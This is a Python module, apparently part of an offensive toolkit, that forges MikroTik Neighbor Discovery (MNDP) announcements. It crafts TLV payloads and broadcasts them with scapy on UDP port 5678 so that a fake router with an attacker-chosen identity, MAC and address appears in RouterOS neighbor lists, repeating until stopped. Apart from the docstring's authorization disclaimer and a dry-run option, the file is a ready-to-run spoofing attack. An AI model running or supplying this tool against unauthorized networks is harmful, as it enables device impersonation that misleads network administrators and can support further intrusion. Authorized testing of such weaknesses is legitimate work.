"""MNDP spoofing: announce a forged MikroTik router with MikroTik Neighbor Discovery.

MikroTik Neighbor Discovery Protocol (MNDP) announces a RouterOS device's identity,
platform, board, version, uptime, interface and addresses in UDP broadcasts on port 5678.
RouterOS lists the devices it hears in its neighbor list. The announcements are not
authenticated, so a host can announce itself as a router with any identity and address.

Format (from a third-party description of MNDP, not yet checked against a RouterOS capture):
a 4-byte header (type 0x0000 and a sequence number, little-endian), then type-length-value
records. Type and length are little-endian 16-bit fields; the value encoding depends on the type.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import struct
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import IP, UDP, Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, Runner, normalize_unicast_mac, read_interface_mac, run_command

MNDP_PORT = 5678
BROADCAST_IP = "255.255.255.255"
DEFAULT_INTERVAL = 60.0
TLV_MAC = 0x0001
TLV_IDENTITY = 0x0005
TLV_VERSION = 0x0007
TLV_PLATFORM = 0x0008
TLV_BOARD = 0x000A
TLV_UPTIME = 0x000B
TLV_SOFTWARE_ID = 0x000C
TLV_INTERFACE_NAME = 0x0010
TLV_IPV4 = 0x0011


def _tlv(kind: int, value: bytes) -> bytes:
    return struct.pack("<HH", kind, len(value)) + value


def _text(value: str, name: str) -> bytes:
    data = value.encode("utf-8")
    if not data or len(data) > 255:
        raise ValueError(f"{name} must be 1 to 255 bytes.")
    return data


@dataclass(frozen=True)
class MndpSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the receivers
    identity: str = "MACabre-RTR"       # device name shown in the neighbor list
    version: str = "7.16"               # RouterOS version string
    platform: str = "MikroTik"
    board: str = "RB750Gr3"
    software_id: str = "MACABR"
    interface_name: str = "ether1"      # interface the neighbor reports itself on
    address: str = ""                   # IPv4 address advertised; empty = omitted
    mac: str = ""                       # MAC advertised; empty = this interface's MAC
    uptime: int = 3600                  # seconds, advertised as uptime
    count: int = 0                      # announcements to send; 0 = run until stopped
    interval: float = DEFAULT_INTERVAL  # seconds between announcements
    dry_run: bool = False               # build announcements but do not send them

    def __post_init__(self) -> None:
        for value, name in ((self.identity, "Identity"), (self.version, "Version"),
                            (self.platform, "Platform"), (self.board, "Board"),
                            (self.software_id, "Software ID"), (self.interface_name, "Interface name")):
            _text(value, name)
        if self.address:
            try:
                ipaddress.IPv4Address(self.address)
            except ValueError as exc:
                raise ValueError("Address must be an IPv4 address.") from exc
        if self.mac:
            normalize_unicast_mac(self.mac)
        if not 0 <= self.uptime <= 0xFFFFFFFF:
            raise ValueError("Uptime must fit in 32 bits.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval < 0:
            raise ValueError("Interval cannot be negative.")


@dataclass
class MndpSpoofingStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def mndp_payload(
    mac: str,
    identity: str,
    version: str,
    platform: str,
    board: str,
    software_id: str,
    interface_name: str,
    uptime: int = 3600,
    address: str = "",
    sequence: int = 1,
) -> bytes:
    """MNDP announcement: 4-byte header, then TLVs."""
    tlvs = [
        _tlv(TLV_MAC, bytes.fromhex(normalize_unicast_mac(mac).replace(":", ""))),
        _tlv(TLV_IDENTITY, _text(identity, "Identity")),
        _tlv(TLV_VERSION, _text(version, "Version")),
        _tlv(TLV_PLATFORM, _text(platform, "Platform")),
        _tlv(TLV_UPTIME, struct.pack("<I", uptime)),
        _tlv(TLV_SOFTWARE_ID, _text(software_id, "Software ID")),
        _tlv(TLV_BOARD, _text(board, "Board")),
        _tlv(TLV_INTERFACE_NAME, _text(interface_name, "Interface name")),
    ]
    if address:
        tlvs.append(_tlv(TLV_IPV4, ipaddress.IPv4Address(address).packed))
    return struct.pack("<HH", 0, sequence & 0xFFFF) + b"".join(tlvs)


def parse_mndp(payload: bytes) -> dict[int, bytes]:
    """Return the TLVs of an MNDP announcement, keyed by type. Raises ValueError if malformed."""
    if len(payload) < 4:
        raise ValueError("MNDP payload is shorter than its header.")
    fields: dict[int, bytes] = {}
    pos = 4
    while pos < len(payload):
        if pos + 4 > len(payload):
            raise ValueError("Truncated TLV header.")
        kind, length = struct.unpack("<HH", payload[pos:pos + 4])
        if pos + 4 + length > len(payload):
            raise ValueError("TLV runs past the end of the payload.")
        fields[kind] = payload[pos + 4:pos + 4 + length]
        pos += 4 + length
    return fields


def build_mndp_frame(sender_mac: str, config: MndpSpoofingConfig, sequence: int = 1) -> Packet:
    """MNDP announcement from `sender_mac`, broadcast to UDP port 5678."""
    mac = config.mac or sender_mac
    payload = mndp_payload(
        mac, config.identity, config.version, config.platform, config.board,
        config.software_id, config.interface_name, config.uptime, config.address, sequence,
    )
    source_ip = config.address or "0.0.0.0"
    return (
        Ether(src=normalize_unicast_mac(sender_mac), dst=BROADCAST_MAC)
        / IP(src=source_ip, dst=BROADCAST_IP)
        / UDP(sport=MNDP_PORT, dport=MNDP_PORT)
        / Raw(payload)
    )


def run_mndp_spoofing(
    config: MndpSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[MndpSpoofingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> MndpSpoofingStats:
    """Send MNDP announcements for the forged router until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = MndpSpoofingStats(
            status=(
                f"Dry run: would announce MNDP router {config.identity} on UDP port {MNDP_PORT} every "
                f"{config.interval:g} s. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = MndpSpoofingStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_mndp_frame(sender_mac, config, sequence=stats.frames + 1), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
